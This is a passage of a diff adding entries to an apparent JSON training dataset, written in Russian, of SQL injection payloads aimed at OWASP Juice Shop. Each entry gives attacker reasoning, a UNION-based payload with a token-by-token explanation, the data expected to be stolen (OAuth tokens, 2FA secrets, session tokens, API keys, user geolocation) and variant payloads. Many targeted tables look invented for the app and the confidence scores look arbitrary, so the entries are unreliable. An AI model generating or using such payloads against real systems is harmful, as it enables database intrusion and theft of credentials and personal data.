+        "reasoning": "1. Интеграция с GitHub хранит токены. 2. Таблица GitHubIntegration. 3. Извлечение OAuth токенов.",
+        "payload": "' UNION SELECT 1,2,3,4 FROM GitHubIntegration--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM GitHubIntegration": "интеграция GitHub",
+            "--": "комментарий"
+        },
+        "expected_behavior": "GitHub токены и секреты",
+        "confidence": 0.76,
+        "variants": [
+            "' UNION SELECT repo,token,owner,webhook FROM GitHubIntegration",
+            "' UNION SELECT * FROM OAuthTokens WHERE service='github'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_100",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных отчетов об ошибках",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "bug_report_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "bug_report_extraction"
+        },
+        "reasoning": "1. Таблица BugReports для отчетов. 2. Конфиденциальные отчеты пользователей. 3. Информация об уязвимостях.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM BugReports--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM BugReports": "отчеты об ошибках",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все отчеты об ошибках",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,userId,title,description,status FROM BugReports",
+            "1 UNION SELECT * FROM BugReports WHERE status='pending'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_101",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных аутентификации через социальные сети",
+        "input": {
+            "field": "provider",
+            "field_type": "string",
+            "context": "social_login",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "social_auth_extraction"
+        },
+        "reasoning": "1. Таблица SocialAuth для OAuth. 2. Токены Google, Facebook, Twitter. 3. Компрометация социальных аккаунтов.",
+        "payload": "' UNION SELECT 1,2,3,4,5 FROM SocialAuth--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM SocialAuth": "социальная аутентификация",
+            "--": "комментарий"
+        },
+        "expected_behavior": "OAuth токены пользователей",
+        "confidence": 0.77,
+        "variants": [
+            "' UNION SELECT id,userId,provider,providerId,accessToken FROM SocialAuth",
+            "' UNION SELECT * FROM OAuthSessions WHERE provider='google'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_102",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных из корзины покупок всех пользователей",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "admin_basket_view",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "all_baskets_extraction"
+        },
+        "reasoning": "1. Административный доступ к корзинам. 2. Таблица Baskets и BasketItems. 3. Полная информация о покупках.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6 FROM Baskets JOIN BasketItems ON Baskets.id=BasketItems.BasketId--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM Baskets JOIN BasketItems": "объединение таблиц",
+            "ON Baskets.id=BasketItems.BasketId": "условие связи",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все корзины и их содержимое",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT BasketId,ProductId,quantity,userId,createdAt FROM Baskets,BasketItems",
+            "1 AND 1=2 UNION SELECT * FROM BasketItems WHERE BasketId IN (SELECT id FROM Baskets)"
+        ]
+    },
+    {
+        "id": "sqli_gen_103",
+        "task": "Сгенерировать SQL-инъекцию для извлечения истории изменений цен",
+        "input": {
+            "field": "productId",
+            "field_type": "integer",
+            "context": "price_history",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "price_history_extraction"
+        },
+        "reasoning": "1. Таблица PriceHistory для аудита цен. 2. История изменений стоимости. 3. Маркетинговая информация.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM PriceHistory--",
+        "payload_explained": {
+            "1": "оригинальный productId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM PriceHistory": "история цен",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все изменения цен на продукты",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,productId,oldPrice,newPrice,changedAt FROM PriceHistory",
+            "1 UNION SELECT * FROM PriceHistory WHERE newPrice<oldPrice--"
+        ]
+    },
+    {
+        "id": "sqli_gen_104",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных из системных логов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "system_logs",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "system_logs_extraction"
+        },
+        "reasoning": "1. Таблица SystemLogs для аудита. 2. Все действия в системе. 3. Полная трассировка.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM SystemLogs--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM SystemLogs": "системные логи",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все системные логи",
+        "confidence": 0.85,
+        "variants": [
+            "1 UNION SELECT id,level,message,userId,timestamp FROM SystemLogs",
+            "1 UNION SELECT * FROM SystemLogs WHERE level='ERROR'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_105",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных двухфакторной аутентификации",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "2fa_settings",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "2fa_data_extraction"
+        },
+        "reasoning": "1. Таблица TwoFactorAuth. 2. Секретные ключи 2FA. 3. Обход двухфакторной защиты.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM TwoFactorAuth--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM TwoFactorAuth": "настройки 2FA",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Секреты 2FA всех пользователей",
+        "confidence": 0.78,
+        "variants": [
+            "1 UNION SELECT userId,secret,backupCodes,enabled FROM TwoFactorAuth",
+            "1 UNION SELECT * FROM TwoFactorAuth WHERE enabled=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_106",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных избранных продуктов",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "wishlist_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "wishlist_extraction"
+        },
+        "reasoning": "1. Таблица Wishlists. 2. Избранные продукты пользователей. 3. Маркетинговые данные.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Wishlists--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Wishlists": "списки желаний",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все избранные продукты",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT id,userId,productId FROM Wishlists",
+            "1 UNION SELECT * FROM Wishlists WHERE userId=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_107",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных сравнения продуктов",
+        "input": {
+            "field": "sessionId",
+            "field_type": "string",
+            "context": "compare_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "compare_data_extraction"
+        },
+        "reasoning": "1. Таблица CompareLists. 2. Сессии сравнения продуктов. 3. Поведенческие данные.",
+        "payload": "' UNION SELECT 1,2,3 FROM CompareLists--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM CompareLists": "списки сравнения",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все списки сравнения",
+        "confidence": 0.82,
+        "variants": [
+            "' UNION SELECT sessionId,productId,addedAt FROM CompareLists",
+            "' UNION SELECT * FROM CompareLists WHERE sessionId IS NOT NULL--"
+        ]
+    },
+    {
+        "id": "sqli_gen_108",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных уведомлений",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "notification_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "notification_extraction"
+        },
+        "reasoning": "1. Таблица Notifications. 2. Уведомления пользователей. 3. История коммуникаций.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Notifications--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Notifications": "уведомления",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все уведомления пользователей",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,userId,message,read FROM Notifications",
+            "1 UNION SELECT * FROM Notifications WHERE read=0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_109",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных реферальных программ",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "referral_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "referral_extraction"
+        },
+        "reasoning": "1. Таблица Referrals. 2. Реферальные ссылки и бонусы. 3. Сеть пользователей.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Referrals--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Referrals": "реферальная программа",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все реферальные связи",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,referrerId,referredId,bonus FROM Referrals",
+            "1 UNION SELECT * FROM Referrals WHERE bonus>0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_110",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных пользовательских сессий",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "session_management",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "active_sessions_extraction"
+        },
+        "reasoning": "1. Таблица UserSessions. 2. Активные сессии всех пользователей. 3. Hijacking сессий.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM UserSessions--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM UserSessions": "активные сессии",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все активные сессии",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT id,userId,token,expiresAt FROM UserSessions",
+            "1 UNION SELECT * FROM UserSessions WHERE expiresAt > datetime('now')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_111",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных CDN конфигурации",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "cdn_config",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "cdn_extraction"
+        },
+        "reasoning": "1. Таблица CDNConfig. 2. Секреты CDN и ключи API. 3. Доступ к инфраструктуре.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM CDNConfig--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM CDNConfig": "конфигурация CDN",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Ключи доступа к CDN",
+        "confidence": 0.77,
+        "variants": [
+            "1 UNION SELECT id,provider,apiKey,endpoint FROM CDNConfig",
+            "1 UNION SELECT * FROM CDNConfig WHERE provider='cloudflare'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_112",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных аналитики",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "analytics_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "analytics_extraction"
+        },
+        "reasoning": "1. Таблица Analytics. 2. Статистика посещений и поведения. 3. Полные данные аналитики.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Analytics--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Analytics": "аналитические данные",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вся аналитика приложения",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,eventType,userId,data,timestamp FROM Analytics",
+            "1 UNION SELECT * FROM Analytics WHERE eventType='purchase'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_113",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных A/B тестирования",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "ab_testing",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "ab_test_extraction"
+        },
+        "reasoning": "1. Таблица ABTests. 2. Конфигурация A/B тестов. 3. Внутренние эксперименты.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM ABTests--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM ABTests": "A/B тесты",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все A/B тесты",
+        "confidence": 0.80,
+        "variants": [
+            "1 UNION SELECT id,name,variant,percentage FROM ABTests",
+            "1 UNION SELECT * FROM ABTests WHERE active=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_114",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных локализации",
+        "input": {
+            "field": "locale",
+            "field_type": "string",
+            "context": "i18n_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "translations_extraction"
+        },
+        "reasoning": "1. Таблица Translations. 2. Все строки локализации. 3. Скрытые сообщения.",
+        "payload": "' UNION SELECT 1,2,3 FROM Translations--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Translations": "переводы",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все строки интернационализации",
+        "confidence": 0.85,
+        "variants": [
+            "' UNION SELECT id,key,value,locale FROM Translations",
+            "' UNION SELECT * FROM Translations WHERE key LIKE '%admin%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_115",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных веб-хуков",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "webhook_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "webhook_extraction"
+        },
+        "reasoning": "1. Таблица Webhooks. 2. URL и секреты веб-хуков. 3. Перехват внешних интеграций.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Webhooks--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Webhooks": "веб-хуки",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Конфигурация всех веб-хуков",
+        "confidence": 0.78,
+        "variants": [
+            "1 UNION SELECT id,url,secret,events FROM Webhooks",
+            "1 UNION SELECT * FROM Webhooks WHERE active=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_116",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных кэша",
+        "input": {
+            "field": "key",
+            "field_type": "string",
+            "context": "cache_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "cache_extraction"
+        },
+        "reasoning": "1. Таблица Cache. 2. Все кэшированные данные. 3. Чувствительная информация в кэше.",
+        "payload": "' UNION SELECT 1,2,3 FROM Cache--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Cache": "кэш",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все кэшированные данные",
+        "confidence": 0.81,
+        "variants": [
+            "' UNION SELECT key,value,expiresAt FROM Cache",
+            "' UNION SELECT * FROM Cache WHERE key LIKE '%session%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_117",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных очередей задач",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "queue_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "queue_extraction"
+        },
+        "reasoning": "1. Таблица JobQueue. 2. Фоновые задачи и их параметры. 3. Внутренние процессы.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM JobQueue--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM JobQueue": "очередь задач",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все задачи в очереди",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,type,payload,status,createdAt FROM JobQueue",
+            "1 UNION SELECT * FROM JobQueue WHERE status='pending'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_118",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных отчетов о производительности",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "performance_reports",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "performance_extraction"
+        },
+        "reasoning": "1. Таблица PerformanceMetrics. 2. Метрики производительности. 3. Данные о нагрузке.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM PerformanceMetrics--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM PerformanceMetrics": "метрики производительности",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все метрики производительности",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,metric,value,timestamp FROM PerformanceMetrics",
+            "1 UNION SELECT * FROM PerformanceMetrics WHERE value>1000--"
+        ]
+    },
+    {
+        "id": "sqli_gen_119",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных бекапов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "backup_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "backup_metadata_extraction"
+        },
+        "reasoning": "1. Таблица Backups. 2. Метаданные резервных копий. 3. Пути и расписания бекапов.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Backups--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Backups": "бекапы",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Информация о бекапах",
+        "confidence": 0.76,
+        "variants": [
+            "1 UNION SELECT id,filename,path,size,createdAt FROM Backups",
+            "1 UNION SELECT * FROM Backups WHERE path LIKE '%backup%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_120",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных миграций",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "migration_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "migration_extraction"
+        },
+        "reasoning": "1. Таблица Migrations. 2. История миграций БД. 3. Версии и изменения схемы.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Migrations--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Migrations": "миграции",
+            "--": "комментарий"
+        },
+        "expected_behavior": "История всех миграций",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,name,executedAt FROM Migrations",
+            "1 UNION SELECT * FROM Migrations ORDER BY executedAt DESC--"
+        ]
+    },
+    {
+        "id": "sqli_gen_121",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных WebSocket соединений",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "websocket_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "websocket_extraction"
+        },
+        "reasoning": "1. Таблица WebSocketConnections. 2. Активные WS соединения. 3. Перехват реального времени.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM WebSocketConnections--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM WebSocketConnections": "WebSocket соединения",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все активные WebSocket соединения",
+        "confidence": 0.77,
+        "variants": [
+            "1 UNION SELECT id,userId,socketId,connectedAt FROM WebSocketConnections",
+            "1 UNION SELECT * FROM WebSocketConnections WHERE connectedAt > datetime('now','-1 hour')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_122",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных файловых загрузок",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "upload_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "upload_extraction"
+        },
+        "reasoning": "1. Таблица Uploads. 2. Метаданные загруженных файлов. 3. Пути к загруженным файлам.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Uploads--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Uploads": "загрузки",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все загруженные файлы",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,userId,filename,path,mimeType FROM Uploads",
+            "1 UNION SELECT * FROM Uploads WHERE mimeType='application/x-php'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_123",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных привилегий API",
+        "input": {
+            "field": "apiKey",
+            "field_type": "string",
+            "context": "api_auth",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "api_privilege_extraction"
+        },
+        "reasoning": "1. Таблица APIKeys. 2. Ключи API и их права. 3. Эскалация привилегий API.",
+        "payload": "' UNION SELECT 1,2,3,4 FROM APIKeys--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM APIKeys": "API ключи",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все API ключи и их права",
+        "confidence": 0.79,
+        "variants": [
+            "' UNION SELECT id,key,name,permissions FROM APIKeys",
+            "' UNION SELECT * FROM APIKeys WHERE permissions LIKE '%admin%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_124",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных ограничений скорости",
+        "input": {
+            "field": "ip",
+            "field_type": "string",
+            "context": "rate_limit",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "rate_limit_extraction"
+        },
+        "reasoning": "1. Таблица RateLimits. 2. Лимиты запросов по IP. 3. Обход ограничений.",
+        "payload": "' UNION SELECT 1,2,3,4 FROM RateLimits--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM RateLimits": "ограничения скорости",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все настройки rate limiting",
+        "confidence": 0.80,
+        "variants": [
+            "' UNION SELECT ip,route,count,resetAt FROM RateLimits",
+            "' UNION SELECT * FROM RateLimits WHERE count > 100--"
+        ]
+    },
+    {
+        "id": "sqli_gen_125",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных геолокации",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "geolocation_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "geolocation_extraction"
+        },
+        "reasoning": "1. Таблица Geolocation. 2. Данные геолокации пользователей. 3. Приватная информация.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Geolocation--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Geolocation": "геолокация",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Координаты всех пользователей",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT userId,latitude,longitude,city FROM Geolocation",
+            "1 UNION SELECT * FROM Geolocation WHERE city='Berlin'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_126",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных устройств",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "device_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "device_fingerprint_extraction"
+        },
+        "reasoning": "1. Таблица Devices. 2. Отпечатки устройств пользователей. 3. Фингерпринтинг.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Devices--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Devices": "устройства",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все зарегистрированные устройства",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,userId,deviceId,userAgent FROM Devices",
+            "1 UNION SELECT * FROM Devices WHERE deviceId LIKE '%mobile%'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_127",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных push уведомлений",
+        "input": {
+            "field": "userId",
+            "field_type": "integer",
+            "context": "push_notification",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "push_token_extraction"
+        },
+        "reasoning": "1. Таблица PushTokens. 2. Токены push уведомлений. 3. Спам и фишинг.",
+        "payload": "1 UNION SELECT 1,2 FROM PushTokens--",
+        "payload_explained": {
+            "1": "оригинальный userId",
+            "UNION SELECT": "объединение",
+            "1,2": "заполнение колонок",
+            "FROM PushTokens": "push токены",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все push токены",
+        "confidence": 0.78,
+        "variants": [
+            "1 UNION SELECT userId,token FROM PushTokens",
+            "1 UNION SELECT * FROM PushTokens WHERE token IS NOT NULL--"
+        ]
+    },
+    {
+        "id": "sqli_gen_128",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных рейтинга продавцов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "seller_rating",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "seller_rating_extraction"
+        },
+        "reasoning": "1. Таблица SellerRatings. 2. Рейтинги и отзывы о продавцах. 3. Репутационные данные.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM SellerRatings--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM SellerRatings": "рейтинги продавцов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все рейтинги продавцов",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,sellerId,userId,rating,comment FROM SellerRatings",
+            "1 UNION SELECT * FROM SellerRatings WHERE rating<3--"
+        ]
+    },
+    {
+        "id": "sqli_gen_129",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных инвентаря",
+        "input": {
+            "field": "productId",
+            "field_type": "integer",
+            "context": "inventory_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "inventory_extraction"
+        },
+        "reasoning": "1. Таблица Inventory. 2. Остатки на складе. 3. Коммерческая информация.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Inventory--",
+        "payload_explained": {
+            "1": "оригинальный productId",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Inventory": "инвентарь",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все данные об инвентаре",
+        "confidence": 0.85,
+        "variants": [
+            "1 UNION SELECT productId,quantity,warehouse FROM Inventory",
+            "1 UNION SELECT * FROM Inventory WHERE quantity=0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_130",
